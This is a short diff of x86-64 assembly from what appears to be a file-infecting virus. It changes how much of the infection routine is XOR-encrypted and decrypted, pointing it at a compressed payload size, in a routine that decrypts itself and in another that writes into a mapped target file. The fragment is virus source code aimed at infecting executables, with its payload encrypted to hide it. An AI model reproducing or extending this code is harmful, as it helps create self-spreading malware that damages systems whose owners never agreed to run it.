@@ -97,7 +97,7 @@ can_run_infection:
 	je .valid					; 	goto .valid;
 	lea rdi, [rel begin]				; data = begin addr
 	add rdi, infection_routine - begin		; data += infection_routine - begin
-	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	mov rsi, compressed_data_size2			; size = compressed_data_size2
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 	; TODO: check file is really unciphered
@@ -861,7 +861,7 @@ treat_file:
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - begin);
 	add rdi, [filesize]				;
 	add rdi, infection_routine - begin		;
-	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	mov rsi, [compressed_data_size]			; size = compressed_data_size
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
